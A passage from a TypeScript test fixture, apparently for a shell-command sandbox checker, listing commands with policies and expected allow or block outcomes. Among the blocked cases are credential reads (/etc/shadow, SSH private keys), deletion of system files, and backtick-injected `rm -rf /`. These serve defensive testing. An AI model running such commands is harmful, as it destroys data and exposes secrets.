  { command: "ls /home/alice/project/src", argv: ["ls", "/home/alice/project/src"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g9-ls-subdir" },
  { command: "cat /home/alice/project/README.md", argv: ["cat", "/home/alice/project/README.md"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g9-cat-readme" },
  { command: "head /home/alice/project/logs/app.log", argv: ["head", "/home/alice/project/logs/app.log"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g9-head-logs" },
  { command: "cp file.txt /home/alice/project/backup.txt", argv: ["cp", "file.txt", "/home/alice/project/backup.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g9-cp-abs" },
  { command: "cp /home/alice/project/a.txt /home/alice/project/b.txt", argv: ["cp", "/home/alice/project/a.txt", "/home/alice/project/b.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g9-cp-abs-abs" },
  { command: "mv /home/alice/project/a.txt /home/alice/project/b.txt", argv: ["mv", "/home/alice/project/a.txt", "/home/alice/project/b.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g9-mv-abs-abs" },
  { command: "mkdir /home/alice/project/newdir", argv: ["mkdir", "/home/alice/project/newdir"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g9-mkdir-abs" },
  { command: "touch /home/alice/project/new.txt", argv: ["touch", "/home/alice/project/new.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g9-touch-abs" },
  { command: "chmod 644 /home/alice/project/file.txt", argv: ["chmod", "644", "/home/alice/project/file.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g9-chmod-abs" },
  { command: "find /home/alice/project -name '*.ts'", argv: ["find", "/home/alice/project", "-name", "*.ts"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g9-find-abs" },
  { command: "grep -r TODO /home/alice/project/src", argv: ["grep", "-r", "TODO", "/home/alice/project/src"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g9-grep-abs" },
  { command: "rsync -a /home/alice/project /home/alice/project/backup", argv: ["rsync", "-a", "/home/alice/project", "/home/alice/project/backup"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g9-rsync-out" },
  { command: "stat /home/alice/project/file.txt", argv: ["stat", "/home/alice/project/file.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g9-stat-abs" },
];

// ---------------------------------------------------------------------------
// Group 10: Path outside writable_roots (15, all block in workspace-write)
// ---------------------------------------------------------------------------

const GROUP_10_PATH_OUTSIDE: BashCommandFixture[] = [
  { command: "rm /etc/passwd", argv: ["rm", "/etc/passwd"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g10-rm-etc" },
  { command: "cat /etc/shadow", argv: ["cat", "/etc/shadow"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g10-cat-etc" },
  { command: "rm /var/log/syslog", argv: ["rm", "/var/log/syslog"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g10-rm-var" },
  { command: "cat /usr/local/etc/secret", argv: ["cat", "/usr/local/etc/secret"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g10-cat-usr" },
  { command: "rm /tmp/other-user-file", argv: ["rm", "/tmp/other-user-file"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g10-rm-tmp" },
  { command: "rm /home/bob/secret.txt", argv: ["rm", "/home/bob/secret.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g10-rm-other-home" },
  { command: "rm ~/secrets/key", argv: ["rm", "~/secrets/key"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g10-rm-tilde-secret" },
  { command: "rm /var/data/important.db", argv: ["rm", "/var/data/important.db"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g10-rm-var-data" },
  { command: "rm /opt/app/config", argv: ["rm", "/opt/app/config"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g10-rm-opt" },
  { command: "cat /home/alice/.ssh/id_rsa", argv: ["cat", "/home/alice/.ssh/id_rsa"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g10-cat-ssh" },
  { command: "rm /home/alice/.bashrc", argv: ["rm", "/home/alice/.bashrc"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g10-rm-bashrc" },
  { command: "rm /home/alice/project/../alice2/file.txt", argv: ["rm", "/home/alice/project/../alice2/file.txt"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g10-rm-outside-traversal" },
  { command: "rm /usr/bin/python3", argv: ["rm", "/usr/bin/python3"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g10-rm-usr-bin" },
  { command: "cat /root/.ssh/authorized_keys", argv: ["cat", "/root/.ssh/authorized_keys"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g10-cat-root" },
  { command: "rm /srv/data/file", argv: ["rm", "/srv/data/file"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g10-rm-srv" },
];

// ---------------------------------------------------------------------------
// Group 11: Shell injection (10, all block)
// ---------------------------------------------------------------------------

const GROUP_11_INJECTION: BashCommandFixture[] = [
  { command: "echo \"hello", argv: ["echo", '"hello'], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g11-unbalanced-double" },
  { command: "echo 'hello", argv: ["echo", "'hello"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g11-unbalanced-single" },
  { command: "ls \"$HOME", argv: ["ls", '"$HOME'], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g11-unbalanced-var-double" },
  { command: "echo \"a\" \"b", argv: ["echo", '"a"', '"b'], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g11-unbalanced-even" },
  { command: "echo `date`", argv: ["echo", "`date`"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g11-backticks-echo" },
  { command: "ls `pwd`", argv: ["ls", "`pwd`"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g11-backticks-ls" },
  { command: "echo `uname -a`", argv: ["echo", "`uname -a`"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g11-backticks-nested" },
  { command: "`rm -rf /`", argv: ["`rm -rf /`"], cwd: "/tmp", policy: DANGER_FULL_ACCESS, expected: "block", tag: "g11-backticks-rm-root" },
  { command: "cat /etc/passwd `rm /etc/hosts`", argv: ["cat", "/etc/passwd", "`rm /etc/hosts`"], cwd: "/tmp", policy: DANGER_FULL_ACCESS, expected: "block", tag: "g11-backticks-mixed" },
  { command: "echo a\"b", argv: ["echo", "a\"b"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g11-unbalanced-odd" },
  { command: "echo a\\\"b", argv: ["echo", "a\"b"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g11-escaped-quote" },
];

// ---------------------------------------------------------------------------
// Group 12: Edge cases (20)
// ---------------------------------------------------------------------------

const GROUP_12_EDGE_CASES: BashCommandFixture[] = [
  { command: "", argv: [], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g12-empty" },
  { command: "   ", argv: [], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g12-whitespace" },
  { command: "ls", argv: ["ls"], cwd: "/", policy: READ_ONLY_POLICY, expected: "allow", tag: "g12-root-cwd" },
  { command: "ls", argv: ["ls"], cwd: "/home/alice/project", policy: WORKSPACE_WRITE_NO_NET, expected: "allow", tag: "g12-workspace-cwd" },
  { command: "ls", argv: ["ls"], cwd: "/tmp", policy: DANGER_FULL_ACCESS, expected: "allow", tag: "g12-danger-cwd" },
  { command: "echo 你好世界", argv: ["echo", "你好世界"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g12-unicode-cmd" },
  { command: "echo '日本語", argv: ["echo", "日本語"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g12-unicode-quote-unbalanced" },
  { command: "ls -la | head", argv: ["ls", "-la"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g12-pipe" },
  { command: "ls && pwd", argv: ["ls", "&&", "pwd"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g12-and" },
  { command: "ls || pwd", argv: ["ls", "||", "pwd"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g12-or" },
  { command: "for f in a b c; do echo $f; done", argv: ["for", "f", "in", "a", "b", "c", ";", "do", "echo", "$f", ";", "done"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g12-for-loop" },
  { command: "if true; then echo yes; fi", argv: ["if", "true", ";", "then", "echo", "yes", ";", "fi"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g12-if" },
  { command: "ls $HOME 2>/dev/null", argv: ["ls"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g12-stderr-redirect" },
  { command: "ls -1 | wc -l", argv: ["ls", "-1"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g12-pipe-wc" },
  { command: "cd /home && ls", argv: ["cd", "/home", "&&", "ls"], cwd: "/tmp", policy: WORKSPACE_WRITE_NO_NET, expected: "block", tag: "g12-cd-and-ls" },
  { command: "ls " + "x".repeat(100), argv: ["ls"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g12-long-arg" },
  { command: "rm -rf " + "/".repeat(50), argv: ["rm", "-rf"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "block", tag: "g12-deep-path" },
  { command: "true", argv: ["true"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g12-true" },
  { command: "false", argv: ["false"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g12-false" },
  { command: ":", argv: [":"], cwd: "/tmp", policy: READ_ONLY_POLICY, expected: "allow", tag: "g12-noop" },
];

// ---------------------------------------------------------------------------
// Combined fixture
// ---------------------------------------------------------------------------

export const ALL_BASH_COMMANDS: ReadonlyArray<BashCommandFixture> = [
  ...GROUP_1_READ_ONLY_SAFE,
  ...GROUP_2_WRITE_IN_READ_ONLY,
  ...GROUP_3_WRITE_IN_WORKSPACE,
  ...GROUP_4_NETWORK_BLOCKED,
  ...GROUP_5_NETWORK_ALLOWED,
  ...GROUP_6_DESTRUCTIVE,
  ...GROUP_7_SED_SYSTEM,
  ...GROUP_8_SED_USER,
  ...GROUP_9_PATH_INSIDE,
  ...GROUP_10_PATH_OUTSIDE,
  ...GROUP_11_INJECTION,
  ...GROUP_12_EDGE_CASES,
];

/** Assert at module load: the fixture has 201 entries. */
if (ALL_BASH_COMMANDS.length !== 201) {
  throw new Error(
    `Bash parity fixture has ${ALL_BASH_COMMANDS.length} entries, expected 201`,
  );
}
